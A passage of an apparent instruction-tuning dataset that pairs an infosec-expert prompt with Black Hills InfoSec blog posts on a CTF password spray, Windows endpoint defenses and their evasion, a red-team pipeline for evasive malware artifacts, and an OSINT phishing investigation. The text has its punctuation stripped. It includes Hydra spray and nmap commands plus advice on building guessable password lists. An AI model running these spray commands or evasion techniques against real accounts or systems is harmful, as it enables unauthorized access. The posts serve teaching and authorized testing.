we will not be covering it here Access Granted Performing a Password Spray AI-generated image We now have a valid password for elliot While not an official part of the Mr Robot CTF challenge on TryHackMe BHIS created a secondary machine with a similar theme Before we progress further I want to share a best practice for penetration testing that you should strongly consider while performing authorized testing activity or while working on CTFs or a certification Whenever you obtain a credential or password hash it never hurts to attempt to use that credential elsewhere You never know when something just might be a default password or when a user may be reusing the same password across multiple resources IN SHORT ALWAYS TRY CREDS EVERYWHERE Performing an Nmap scan on the host located at 192.168.80.134 we observe that an SSH port is open nmap -Pn -T4 -sV 192.168.80.134 Nmap Discovers Open SSH Port Performing another Nmap scan with the below command we are able to observe that the SSH server supports password-based authentication which will allow us to perform password sprays and brute force attacks with Hydra nmap -Pn -T4 -sV --script ssh-auth-methods.nse 192.168.80.134 SSH Server Supports Password-Based Authentication Performing a password spray is very similar to performing a brute force attack except that it is the complete opposite Instead of testing many passwords against one username we are testing one password against many usernames We can then use the below Hydra command to password spray the list of users we created with the password ER28-0652 hydra -L users.txt -p ER28-0652 -V ssh 192.168.80.134 This time we can see that we receive another positive hit for elliot which tells us that Elliot has been reusing his password across his accounts Hydra Performs a Successful Password Spray We can then perform another password spray with a simpler password such as robot This time we observe that multiple accounts are accessed This suggests that robot is a default password for new users Multiple Accounts Use Same Password After finding these credentials we can log in on an account of our choice ssh elliot 192.168.80.134 Access Gained through SSH On an actual penetration test this would be an excellent time to perform additional enumeration on the computer's subnet and to begin looking for privilege escalation and persistence vectors Best Practices for Spraying AI-generated image Now that we have the demonstration out of the way let's briefly touch base on how to find good passwords for spraying When you are going to password spray it is best to try and use passwords that are simple in nature and that could be reasonably picked by an unassuming victim This includes passwords that contain Simple terms such as password welcome and letmein which may or may not include leet speak substitutions password vs passw0rd The names of seasons Winter Spring Summer Fall or Autumn The current year or previous year that being 2023 or 2024 at the time of this article The name of the state where the organization is headquartered The name of the organization Political figures such as President Trump and President Biden That use or omit a special character at the end Using an exclamation point is always a safe bet Let's put a few of these bullets together and come up with a list of passwords to use for password spraying a pretend school based in Illinois that has a peacock as its mascot PretendSchool2023 Winter2024 Password123 Illinois2024 Peacock2024 Welcome2023 Trump2024 Biden2024 Letmein123 passw0rd Always try and use passwords that are associated with the organization or service that you are spraying These are much more likely to provide results than something like 2349823h9fhu234r 2SASQUATCH Lastly if you're looking for a solid collection of wordlists I strongly recommend the SecList collection ithub.com danielmiessler SecLists Closing Statements Password-based attacks are a common attack vector in the wild and are evidence of why multi-factor authentication should be used to protect user resources Hydra and tools like it are crafted to attack passwords and can be used to gain access to systems where a password is properly guessed Practicing good password security and using multi-factor authentication is essential as that will greatly reduce the likelihood of an attacker being able to successfully breach an account Happy hacking and stay safe and legal out there"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Initial Access Operations Part 1: The Windows Endpoint Defense Technology Landscape</title>\n<taxonomies>Informational, InfoSec 301, Joff Thyer, Red Team</taxonomies>\n<creation_date>Thu, 22 Feb 2024 16:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Today's endpoint defense landscape on the Windows desktop platform is rich with product offerings of quite sophisticated capabilities Beyond the world of antivirus products Extended Detection and Response XDR and complementary behavioral analysis approaches provide a broad coverage of both initial access malware techniques as well as post exploitation activity detection Anybody participating in Red Teaming activities today will tell you that gaining initial access through the execution of some binary artifact is much harder now than ever before Even if access is gained on a Windows desktop platform post exploitation activities by common command and control platforms are well studied and with well-instrumented defense responses in mature environments This enhanced endpoint defense posture has resulted in both Red Teamers and Threat Actors shifting tactics to other vulnerable areas such as cloud resource misconfiguration team collaboration tools software developer supply chains and the ever-present credential mis management challenges that persist across 0road array of information technology solutions The defensive technique technology list below is focused on defense product techniques with brief mention of integrated Windows features There exists a host of other Windows Operating System security features such as Address Space Layout Randomization ASLR Data Exception Prevention DEP and Control Flow Guard CFG for example which is not the focus of this article Examples of defense technique coverage include items such as the following Static artifact analysis Event tracing for Windows Windows kernel notification callbacks Windows DLL API hooking Process Tree Analysis Memory Page Scanning Call Stack Tracing Windows 10 11 hardware enforced stack protection Kernel driver block listing I won't bother speaking about static artifact analysis too much since it's fairly self-evident given entities like Virus Total and the like Briefly it is true to say that any static artifact with a high entropy score i.e large amounts of embedded encrypted data will likely drive an immediate detection from most products Having said that let's cover some of these other techniques Event Tracing for Windows ETW This technology implements tracing and event logging for both user mode applications and kernel driver activities The Windows Event Tracing API is implemented in three components Controllers which can start or stop event tracing sessions Providers which supply the event data itself Consumers which consume the event data Event Tracing ArchitectureSource earn.microsoft.com en-us windows win32 etw about-event-tracing There are three types of providers Managed Object Format MOF Windows software trace preprocessor WPP and finally trace logging which is what provides the ETW logging Needless to say if you subscribe as a consumer to ETW data you will receive a huge volume of trace logging which includes almost any Windows API call that can be made by an application and is quite literally a fire hose of information Windows Kernel Notification Callbacks Back in the bad old Wild West days many defense products would place redirection hooks into the System Service Descriptor Table SSDT to receive the necessary telemetry on application activities Microsoft rightfully decided that they didn't particularly like this technique since any small 3rd party developer software defects could and did result in destabilizing the Windows kernel When Windows Vista was released Microsoft released an accompanying change called Patch Guard Kernel Patch Protection which enforced that 3rd party vendors could no longer place hooks into the SSDT among other things.As you can imagine many of the defense vendors did particular like the idea of a loss in telemetry and thus Microsoft did provide a feature called Kernel Notification Callbacks This feature has been steadily enhanced since its initial release Kernel Notification Callbacks allowed a signed kernel driver to register a callback routine in order to receive notifications At a high level the different notifications include PsSetCreateProcessNotifyRoutine Registers a callback routine for process creation events PsSetCreateThreadNotifyRoutine Registers a callback routine for thread creation events PsSetLoadImageNotifyRoutine Registers a callback routine for image load events ObRegisterCallbacks Registers a callback routine for object changes such as when a process thread or desktop handle is opened or duplicated CmRegisterCallback Registers a callback routine for any Windows registry operations Given this granularity of notification information it should be no surprise that defense vendors used signed drivers that will leverage a number of the above notifications The advantage of doing this at a kernel level is a smaller chance of malware tampering with the callback registration or data Although be aware that signed and vulnerable kernel drivers exist that are not on the block list which presents a risk of tampering Windows DLL API Hooking API hooking has long been a technique to redirect code execution in a Windows user mode process This can be performed on almost any loaded image module in a process but is however most commonly performed on ntdll.dll which is always loaded along with kernel32.dll and now kernelbase.dll in all application processes The Windows Native API is a set of application programming interfaces used in the Windows operating system ntdll.dll is a dynamic-link library that contains a collection of functions that are part of the Windows native API ntdll.dll system calls syscalls are low-level functions that provide an interface between user-mode applications and the Windows kernel When a user-mode application needs to perform a privileged operation or interact with the operating system's kernel it makes a system call Instead of directly invoking kernel functions applications call functions within ntdll.dll which in turn makes the necessary system calls to the Windows kernel Let's look at an example of the ntdll.dll API call NtWriteVirtualMemory For the image below I started up the Windows debugger WinDBG and a notepad.exe process because we love picking on notepad After attaching the debugger to the process I disassembled the API call First note that this is a 64-bit process and we are staying there because there is a dwindling amount of 32-bit systems these days anyway The first two machine code opcodes below are doing the following mov r10 rcx save a copy of RCX in the R10 register mov eax move the system call number into the EAX register EAX is just a 32-bit notation for the RCX 64-bit register Next there is a test to see whether we should be using the int 0x2e interrupt driven system call convention or the syscall instruction Either way a system call is going to occur Now because we can open any process that we have the appropriate security token rights to open we can also overwrite virtual memory in a process As it turns out we can replace the second opcode with a JMP instruction to redirect the code to a new memory location Conveniently a 32-bit short JMP instruction fits nicely into the 5 bytes available to us Overall the sequence to hook an API in ntdll.dll for a defensive product might look something like this The defensive product receives some kernel notification callback that it considers interesting The defensive product opens the application process and injects into the process some code to load its own signed DLL module Alternatively the defensive product may be configured such that its own signed DLL module is loaded for all process creation in which case this step would be unnecessary The defensive product finds the address of the ntdll.dll API of interest and overwrites the second opcode with a JMP instruction into code of the newly loaded DLL module Depending on the DLL loaded some sort of defensive scanning actions or just further notification or even perhaps a direct blocking on the API call is made If not blocked the defensive product DLL will move the correct SYSCALL number into the EAX register and then JMP back to the SYSCALL instruction of the original API ME1 ntdll.dll API hooking may or may not be implemented dynamically using kernel notification callbacks In some instances the defense product design might hook many of the ntdll.dll API's upon an image load notification for all processes and leave them hooked for the lifetime of the processes Visually the whole sequence can be represented as follows Event Driven API Hooking Process Tree Analysis The idea here is to create an internal representation of the running processes on a system and their hierarchical relationships The parent child relationship data can be compared with a set of static rules and or processed through an artificial intelligence model in order to identify abnormal outliers A simple example might be to consider the PowerShell process as potentially suspicious if it is a child process of an Excel spreadsheet Memory Page Scanning It is not uncommon for malware to allocate some pages of virtual memory copy some machine code shellcode to that memory set the page s to the PAGE_EXECUTE_READ permission and create a thread pointing to the start address of the memory allocated Virtual memory is a memory management technique that provides an abstraction of the physical memory resource On Windows and many other operating systems a page of virtual memory consists of 4096 contiguous allocated bytes The thread of execution created could be in the same running process that the malware started or could be injected into a foreign process accessed by the malware assuming the security token of the malware process has sufficient rights to access the foreign process Defensive products can use the ntdll.dll API NtQueryInformationThread to determine any process thread's starting address In addition the kernel32.dll API VirtualQuery or VirtualQueryEx can be used to obtain allocated virtual memory properties The kernel32.dll API functions ending in Ex are typically those which can access a tertiary process using an open process handle as opposed to the local process It is also possible to use the ntdll.dll API call NtReadVirtualMemory to directly examine memory contents itself Some easy detection opportunities arise from memory page scanning If virtual memory is allocated and protections are set to READ WRITE and EXECUTE then it is pretty much guaranteed to be malicious The reason that READ WRITE and EXECUTE permissions on virtual memory pages is an indicator of compromise is related to how virtual memory is used in a typical Windows process Executable machine code in say the .text section of a PE COFF executable will typically be mapped into virtual memory pages set to READ and EXECUTE only.As the code in a process executes memory is going to be modified either on a thread's stack or the heap with some additional fixed symbolic information mapped from the .data section of a PE COFF module In these use cases we typically will see either READ ONLY permissions on virtual memory pages or READ WRITE permissions If virtual memory is set to READ and EXECUTE and the memory is not backed by a DLL module image load when the thread is created it is likely malicious Commonly used shellcode like those in the Metasploit project Cobalt Strike and others have distinct known memory patterns that can be directly matched Detection methods have also included heap allocation scans for Cobalt Strike profile data for example Note A related offensive evasion technique is to encrypt any heap data when a C2 client shellcode goes in out of sleep mode Call Stack Tracing Analysis Whenever a process thread is created a region of memory is always allocated for the thread's stack The stack is organized into stack frames whereby every function call creates a new frame A stack frame will contain local variables belonging to the specific function as well as a function return address As any code in a thread executes its stack will grow and shrink as various functions are called This means that at any point in time the thread's stack sometimes referred to as the call stack has a trail of evidence showing the sequence and depth of function calls Defensive products can use a kernel callback to trigger call stack analysis which will unwind the call stack and most often check to see if any function calls were made from memory not backed by a DLL module image loaded from disk A related concept to this is exception handling information in which the .pdata section of a 64-bit PE COFF image contains function table entries containing exception handling code on a per function basis From an offensive perspective it is possible to write fake information into the call stack making it look like all function calls are completely legitimate This act will evade defeat call stack tracing defenses Windows 10 11 Hardware Enforced Stack Protection With the introduction of Windows 11 and appropriate processor support there exists a new defensive technique called Hardware Enforced Stack Protection This feature will only work if the underlying processor provides support such as Intel's Control-flow Enhancement Technology CET or AMD's shadow stacks In short for all running processes the return address of any function call is pushed onto both the process thread's call stack as well as a shadow stack maintained by the processor Whenever a return instruction RET is encountered the return addresses on both stacks are compared If the addresses do not match then a control protection exception is issued This exception is caught by the Windows kernel which in turn will terminate the offending process Source ww.intel.com content dam develop external us en documents catc17-introduction-intel-cet-844137.pdf Using shadow stacks for comparing function return addresses provides a defense against Return Oriented Programming ROP gadget use as well as any attempt to fake a call stack thereby making any call stack analysis more effective.Within the same suite of protections Intel has also implemented Indirect Branch Tracking IBT which is focused on defeating both Jump and Call Oriented Programming COP JOP attack methods Kernel Driver Block Listing One of the more attractive attacker targets that exists in the Microsoft Windows kernel environment is a signed driver that has a vulnerability With direct access to kernel memory via a vulnerable signed driver any kernel mode data structure can be modified including the ability to disable signed driver enforcement and load any custom driver that the attacker wishes to If a vulnerable driver already exists on an endpoint some custom user mode application code can be written to exert control over that driver and perform further exploitation If an attacker has privileges on a system then an approach known as Bring Your Own Vulnerable Driver BYOVD can be used to install a driver for further exploitation Once any level of control is established in the kernel system security is completely compromised with no limits other than imagination for attacker capability Unfortunately driver development is a non-trivial endeavor and there is a lot of code sharing that occurs in the community On top of this there are numerous devices and drivers going back in time that are used in different environments This is a rich area of exploitation for threat actors today As such with the introduction of Windows 11 as of the 2022 update Microsoft has enabled the vulnerable driver blocklist Microsoft runs a program for vulnerable driver submissions and updates the vulnerable driver blocklist with each major release of Windows about twice a year Microsoft also provides a way to manually update the list using the Windows defender application control policy Unfortunately the Microsoft blocklist is far from comprehensive and as you might imagine it is very difficult to adequately maintain such a resource with so many devices and drivers in existence Thus there still exists many vulnerable and signed drivers today which are being actively exploited Furthermore there are lists of vulnerable drivers that are made available online One of these is here at ww.loldrivers.io Conclusion The list of techniques and descriptions above should now give you a good sense of why it is increasingly difficult to achieve a foothold on a Windows endpoint and perform post exploitation activities in a maturely instrumented environment Having said that initial access operations for Red Teamers are not impossible just dependent on more sophisticated mature artifact generation techniques In my opinion achieving this requires an offensive DevOps approach This is described in the next blog post entitled Initial Access Operations Part 2 Offensive DevOps coming soon Be sure to tune in next Thursday 2 29 at 1pm EST for Joff's webcast Exploring the Python psutil Module Under Windows w Joff Thyer Learn more and register HERE"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Initial Access Operations Part 2: Offensive DevOps</title>\n<taxonomies>Informational, InfoSec 301, Joff Thyer, Red Team, devops, malwaredev</taxonomies>\n<creation_date>Thu, 29 Feb 2024 14:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "The Challenge As stated in PART 1 of this blog the Windows endpoint defense technology stack in a mature organization represents a challenge for Red Teamer initial access operations For initial access operation success in a well-instrumented environment we typically need to meet a minimum bar for artifact use such that The generated software artifact is unique to evade any static analysis detection Windows event tracing is squelched in user mode artifact execution Kernel callback notifications are either not interesting or even better are disabled Artifact API use is not interesting enough to trigger some dynamic NTDLL API hooking behavior Parent child process relationships are not interesting from a process tree analysis perspective Any process thread creation is preferably backed by some signed legitimate disk DLL module artifact Sandbox execution will force our artifact to abort terminate immediately Any kernel level exploitation cannot use a driver on the block list While the above is easy to write the actual software malware development techniques to achieve the goals are less trivial To be fully effective we need an ability to dynamically recompile malware artifacts to do things like changing the artifact size and entropy use unique encryption keys re-process incoming shellcode provide the ability to introduce operator configurable options artifact signing and more All these items point directly to employing a continuous integration continuous development CICD approach to achieve a level of continuous defense evasion for produced artifacts We employed the CICD feature set of GitLab Community Edition for implementing this approach The following describes a generic approach I call Malware As A Service MAAS and introduces a public repository as a template that you might employ to achieve similar goals Gitlab CICD Pipelines The GitLab CICD pipeline is driven by an easily human digestible YML file syntax which can be enabled by putting a file named .gitlab-ci.yml in the home directory of a GitLab repository The YML syntax allows us to define build stages into the pipeline with different jobs associated with each stage Any single pipeline run can be triggered by a git commit and push or merge action for the repository The YML syntax allows us to define trigger actions which subsequently allows for dynamically created child pipelines Any child pipeline is simply another YML file being triggered by the parent global YML configuration Gitlab Runners A GitLab runner is software installed on a standalone server or virtual container that uses the GitLab API to poll a repository for pipeline jobs to be executed When it first starts a GitLab runner will register itself with the API thus allowing it to subsequently service any pipeline jobs that are sent to it The runner will process instructions in the GitLab YML file which in most cases will include the processing of a script indicated by the script tag in the YML content The script is commonly executed by the native operating system shell in the case of Windows this might be CMD.EXE and in the case of Linux this might be bin bash or similar The shell used is configurable and could be for example set to pwsh.exe or pwsh if you wanted a common shell syntax across platforms Based on our software compilation needs we chose to deploy both Windows-based runners and Linux-based runners with PowerShell configured on the Windows systems and the default bin bash shell configured on Linux runners which we chose to deploy within Docker containers The specific architecture choice for using Docker was driven largely by the set of Python scripts which generate dynamic pipeline configuration information Docker essentially eases the versioning and change control burden within the overall environment In our case we do require full stack Microsoft compilation tools as well as Linux-based mingw-gcc Golang Rust and a full mono .NET installation This necessitated the deployment of both Windows and Linux-based runner architecture with shared storage The diagram below is our version 1.0 architecture The astute observer will notice that Docker is deployed on both Linux hosts but not deployed in the Windows architecture case While it is possible to run Docker on the Windows platform at the time of this first version of architecture there was a requirement to pick between HyperV Windows container mode or Linux container mode and it simply became easier to deploy these servers in their native O S form You will also notice that this entire architecture is contained within an ESXi Hypervisor which in the future will be scaled up and replicated for redundancy Artifact Generation Docker Containers Using Docker swarm and shared storage in the backend allows us to deploy dedicated Docker containers for dynamic malware generation We currently have two different types of containers one of which is a Python-based framework for compiling C Golang and C C source code and a second which is dedicated to the Rust language and compiler As a part of the C .NET framework container system we have deployed modules to perform source code obfuscation various evasion techniques such as ETW and AMSI bypass patching and code to perform PE COFF fixes as needed such as recalculation of PE header checksums for example CI CD Pipeline Execution The below diagram is captured from GitLab directly showing various stages of pipeline execution There are early preparation stages artifact generation stages dynamic child pipeline trigger stages and post processing activities listed Parts of the CI CD pipeline perform dedicated tasks such as MSIX AppX and ClickOnce package generation from existing malware artifacts for example Pipeline job parallelization is achieved via both GitLab runner configuration options and multiple Docker container registration in the overall architecture One of the dedicated containers uses the idea of resource script consumption which allows us to split compilation jobs by architecture and compilation language There are of course other ways to parallelize runner execution jobs depending on the way that dynamic child pipeline YML configuration is generated GitLab Runner YML Files and Python Generation Scripts The master parent pipeline script is contained in the .gitlab-ci.yml file in the root directly of the repository Within this file dynamic child pipeline triggers are defined which call out to Python scripts used to generate more YML configuration for downstream stage execution of pipeline jobs These generated YML file artifacts are passed down from earlier to later stages of the pipeline execution The diagram below is a snapshot of the master .gitlab-ci.yml file showing numerous aspects including pipeline stages workflow rules for global pipeline triggering actions and the initial preparation stage which dynamically generates some YML for downstream stages For completeness I have also included a screenshot of the configuration section showing the dynamic trigger dependencies executed as part of the BakingMalware stage of the pipeline How to Operate the Malware Artifact Generation Pipeline There are numerous potential inputs that a Red Team operator might need to supply These might be anything from supplying shellcode itself configurating various evasion switches IP address information URL's and more We fondly refer to our internal pipeline as a Payload or Malware Buffet and as such I provide a configuration file called BuffetConfig.yml which the operator must edit in order to subsequently push up the changes and trigger the pipeline execution This particular YML file is processed by various scripts inside the pipeline execution and is distinctly different from the YML content that drives the pipeline itself To further enhance and standardize our configuration the default parameters of this BuffetConfig.yml file are now represented within Python classes using Python pydantic models This step allows us to move further towards automated triggering of this pipeline by other operational deployment software in our organization On our roadmap is also to provide a web interface directly for configuration purposes This diagram is an example of what a portion of this BuffetConfig.yml file contains Note that Zulu Foxtrot is a reference to a malware artifact generation container Expected Results from a Pipeline Execution When the pipeline is triggered and all of the stages have executed we have in post processing stages which produce ZIP files of the generated artifacts to be used by Red Team operators There will be multiple ZIP files containing items like the raw artifacts themselves EXE DLL reflexive DLL's XLL's and other desired files manifest information MSIX AppX ClickOnce and other packaging methods Using a modest configuration with only one artifact generation container configurated example results are as follows 57 binary artifacts and HTML-based MANIFEST19 EXE's of both the Windows managed .NET and native unmanaged variety26 DLL's both managed and unmanaged4 RDLL's reflexive native unmanaged 6 XLL's Excel DLLs 9 MSIX AppX packages 9 Click Once packages Over 1GB of total data content produced with a modest 20Mb artifact inflation entropy reducer configuration in place Metrics and Tracking One of the last post processing stages of the pipeline uses a Python script which calculates various hashes MD5 SHA1 and SHA256 of produced artifacts and writes the result into a SQLITE database with date timestamp information for tracking purposes This data allows us to do numerous things including producing summaries of artifact generation over time in graphical formal The diagram below shows some artifact generation statistics from the pipeline during the month of September 2023 Advantages of CI CD Approach Combined with the docker container frameworks we can achieve automated unique binary artifact generation delivery on every single pipeline run This includes a large diversity of artifact types with unique encryption key generation for any embedded artifacts and unique source code obfuscation techniques The overall pipeline approach gives us flexibility to add or modify new malware development techniques in a systematic way and make them quickly available to Red Team operators The pipeline also opens up opportunities for different forms of pre and post processing whether this be further embedded shellcode encoding for example or in the form of post artifact repackaging There is no doubt that this approach enables us to deliver defense bypass techniques that easily evade static artifact analysis phases and instead move the burden up raise the bar to behavioral analysis in artifact execution Disadvantages of CI CD Approach The pipeline configuration and execution has significant complexity There are many software dependencies in the form of multiple language compilers multiple different tools and versioning concerns on the GitLab runners In addition the speed of CI CD pipeline troubleshooting is a challenge with an average pipeline run taking anywhere from 3 to 10 minutes The current architecture is oversensitive to simple syntax errors in configuration input with an increasing level of Python script bloat to drive the dynamic elements Using git itself is not an ideal operator user interface with a move towards a frontend web interface approach remaining on the roadmap to improve this aspect Lastly the Red Team operators do suffer from a certain overwhelming factor due to the large diversity of artifacts produced This could be phrased as a too many toys to play with sort of problem Reminding operators to Read the Manifest is an aspect of this however there is potential in the future to introduce configuration presets to help in the uncertainty and overwhelming aspect of pipeline execution results Miscellaneous Penetration Tester Comments After having achieved a degree of successful adoption of this technology I decided to informally poll our penetration testers about this creation I asked this question How many hours would it take you to manually produce the necessary evasive artifacts that you now get automatically from the malware buffet pipeline The responses and ensuing discussion are summarized by these thoughts We think this saves 8 16 hours of time per customer engagement My development skills are limited and this pipeline is an invaluable critical resource for me Before this existed I would spend 2 days fumbling around on the internet and compiling various proof of concept POC code just hoping that it would work for me Your work has changed how I operate I now focus a lot more on the engagement operation itself Your work has brought a lot more consistency across our customer engagements Conclusion It should be noted that the underlying technologies employed in the pipeline are many and varied including both published projects online as well as software written here at Black Hills Information Security In the process of developing evasive malware artifacts there are many techniques and we stand on the shoulders of a great many people in our community willing to share research and resources From the CI CD development perspective I have put together a resource which should be viewed as a templated approach for standing up your own pipeline projects It's sort of a paint by numbers guideline effort which you can find here at ithub.com yoda66 MAAS Notable tools and projects that went into many aspects of development include the following WinDBG yes the Windows Debugger Look for the MS app store version System Informer ysteminformer.sourceforge.io SysInternals Process Explorer earn.microsoft.com en-us sysinternals downloads process-explorer API Monitor ww.rohitab.com apimonitor MS Visual Studio Mono and Mingw-w64 cross compiler Python3 for many YML generation scripts PE-SIEVE ithub.com hasherezade pe-sieve DnSpy ithub.com dnSpy dnSpy Resource Hacker ww.angusj.com resourcehacker Many different .NET Obfuscation Technologies and Projects SysWhispers3 ithub.com klezVirus SysWhispers3 In addition there are many fine individuals and companies who are kind enough to share blogs and articles about various development and evasion techniques Here is a list of various resources I have turned to at various times Of course given the nature of our work published information is changing all the time I hope you enjoyed reading this and gained some insight into techniques and methodology that you might choose to employ in your work also ocs.gitlab.com ee ci efuse.ca online-x86-assembler.htm ww.blackhillsinfosec.com avoiding-memory-scanners ww.elastic.co fr security-labs upping-the-ante-detecting-in-memory-threats-with-kernel-call-stacks ww.cobaltstrike.com blog behind-the-mask-spoofing-call-stacks-dynamically-with-timers security101.medium.com uncovering-windows-events-b4b9db7eac54 odemachine.com articles x64_deep_dive.html ww.crowdstrike.com blog crowdstrikes-advanced-memory-scanning-stops-threat-actor ecurityintelligence.com x-force direct-kernel-object-manipulation-attacks-etw-providers ww.mdsec.co.uk 2023 09 nighthawk-0-2-6-three-wise-monkeys READ PART 1 Be sure to catch Joff's webcast Exploring the Python psutil Module Under Windows TODAY at 1pm EST Pre-show banter starts at 12 30pm Recording available Find it here ww.youtube.com live _cTiTHZfewY"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>OSINT for Incident Response (Part 2)</title>\n<taxonomies>Incident Response, Informational, Patterson Cake, OSINT</taxonomies>\n<creation_date>Thu, 07 Mar 2024 16:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Be sure to read PART 1 Metadata and a New-Fashioned Bank Robbery Let's face it some cases are just more interesting than others and when you do incident response for a living you've got to find joy in your work where you can Sometimes after the initial call with a customer you just want the case You'd almost do it for free we don't suck at capitalism quite that much because of the allure the mystery the challenge This was one of those cases The customer was a financial services institution with locations throughout the United States highly regulated with highly segregated technology and workflow They had defense-in-depth security solutions from the endpoint to the perimeter micro-segmentation throughout their environment extensive auditing and monitoring capabilities complete with separation of duties for all workflow involving significant financial transactions In short they were checking all the cybersecurity best practices boxes and then some But they were still getting robbed I'm sure all financial services institutions suffer from some measure of loss due to fraudulent transactions But FFSI Bank Fictitious Financial Services Institution Bank because that's just how creative I am was seeing a significant increase in fraudulent activity for a specific type of transaction over a period of recent months Because they ran such a tight ship they'd caught and stopped most of the transactions but despite extensive internal analysis they'd failed to identify or stop the source On the initial call they were clearly a very smart and capable group and seemed frustrated and a little embarrassed that they were unable to figure this out on their own Could it be an insider threat with multiple internal collaborators Might it be some new extremely stealthy malware Was it possible that their multiple layers of security and segmentation had somehow been breached from the outside The part that isn't fun about engagements like this is preparing the proposed statement of work Hey Derek how many hours you think this is going to take To which Derek replies Oh somewhere between 40 and 400 Exactly I mean these are smart folk with some pretty cool capabilities To do better we'll need to dig deeper further wider But first OSINT We went back to the customer warned them that this could get expensive but proposed spending a few hours performing some external analysis first to see what we could see and learn from the internet As per OSINT for Incident Response Part 1 a compromise usually occurs because something changed from misconfigurations to zero-day exploits to end-user behaviors and the avenue of attack is most frequently the internet If the internet knows the threat actors bank robbers know and as incident responders we need to know I have a standard 5-minute OSINT for IR process see Part 1 which I ran through I was fairly certain this wasn't going to be that easy but it was still a good place to start and yielded some useful information though no smoking guns Much of OSINT is reviewing intentionally public information like DNS records then sleuthing out tangential or inferred data For example if FFSI has a DNS A record mapping the name portal.ffsibank.com to 50.x.x.100 and another mapping support.ffsibank.com to 50.x.x.102 we can hypothesize that 50.x.x.101 likely belongs to FFSI subject to validation of course If I pull on that particular thread lookup 50.x.x.101 and find reverse DNS records that map to dev.ffsibanking.com which is slightly different bank vs banking but pretty clearly related I now have additional domains to enumerate Sadly in this case I pulled on all the IP address and DNS domain threads and nothing unraveled So I scratched my head a bit mused about how to go deeper further wider and pondered the question What is the most granular search query I can perform that still uniquely identifies the customer I can't very well search for F or FF and obtain useful results but what if I base OSINT searches on FFSI or FFSIB or ffsibank So I visited hodan.io ran these queries and came up empty Then I visited eakix.net and got a promising hit for ffsibank Apologies that the images are so redacted but they are hopefully still representative Ironically the result below is an actual fairly recent hit on a related search term 'visit_log.txt see below for an entirely different non-fictional financial institution Leakix.net Search Term Results ffsibank Based on my leakix.net results I suddenly have multiple additional threads to pull on including a new IP address a domain name a service provider Digital Ocean a geographical location etc Which do I pull on first Honestly I want to browse the site in question but I want to do it safely and from an unattributable IP as I don't want to tip my hand to the threat actor if I can avoid it Browserling to the rescue Browserling is basically a hosted virtualized browser session primarily designed for web testing and development You can use it for free with some limitations or pay a very reasonable price to extend features www.browserling.com I started by visiting the bare URL mail.redacted-pid.com where I was torn between doing my personal banking or trying my luck at some digital slots Apologies for the intentionally blurry screenshot as it is actually from case data Browserling visit to the suspect domain Why would a Cambodian gambling site have references to ffsibank And isn't this supposed to be a mail server The plot thickens Let's see if we can find the ffsibank reference while safely browsing through Browserling Browsing mail.redacted-pid.com ffsibank folder Browsing the site contents reveals an ffsibank folder The contents of that folder turn out to be high-quality imitations of the FFSI Bank customer login portal Browsing the contents of the ffsibank folder simulated Smoking gun Yeah I think so But we're not done yet What else can we see learn extrapolate Do you think this is the only site attempting to mirror the FFSI Bank customer portal Returning to the parent directly as above note the visit_log.txt file We want to be very careful accessing content on the site so we can attempt it via Browserling or perhaps you have another authorized mechanism for visiting suspicious websites like curl or wget command-line web browsers on an isolated virtual machine that's an entirely different blog post In this case the file was legitimately just a text file containing user-agent strings information about the browser used for access and IP addresses for everyone who'd been duped into visiting the folders in the Index of image above A smoking gun and a gold mine in one fell swoop What about other potentially malicious sites Let's pull on the certificate thread and see what we can find Next I visited earch.censys.io to leverage their certificate services search features Since modern browsers are very aware of insecure sites or certificate to domain name misalignments the threat actors are often smart enough to use https and a valid certificate After all they can now easily do so for free On search.censys.io I'll start with a Certificates wildcard search 'names ffsib first then depending on results I'll likely drill down to a specific free certificate services provider e.g Let's Encrypt Search.censys.io Certificates ffsib Search How do you spell bank anyway When I first performed the wildcard name search there were approximately 425 returned results many of which were likely valid legit But I noticed a pattern of three or four certificates with common name CN and a slight misspelling of the word bank as above Re-running the search and filtering on Let's Encrypt as a certificate services provider it became clear that there were indeed many more forged malicious sites being used to target FFSI Bank customers Search.censys.io Certificates ffsib Let's Encrypt Search At this point we're ready to report back to the customer with some pretty significant insight into targeted attacks against their customers We're also able to derive high-fidelity intelligence to help identify existing malicious sites and monitor for new malicious sites e.g ffsibank directory visit_log.txt file Let's Encrypt associated certificate etc And I'm happy to report that we accomplished all of this well below the 40 to 400 hour initially projected timeframes OSINT for the win As mentioned in OSINT for IR Part 1 being a digital-forensics and incident response consultant is largely about unanswered questions When we engage with a client they know something bad happened or is happening but they are uncertain of the how when where and why A significant component of our job is to tease out the known knowns the known unknowns and effectively and efficiently help the client answer their questions OSINT for IR can be extremely valuable and should be part of the investigative process Case 3 Metadata and Denial of Service via Domain Account Lockouts In the next installment of OSINT for IR we'll continue our metadata sleuthing adventures and unravel an enterprise-wide Active Directory account lockout denial of service attack Thanks for reading READ PART 1 Be sure to tune in next Thursday 3 14 at 1pm EDT for Patterson's webcast Demystifying Windows Malware Investigations w Patterson 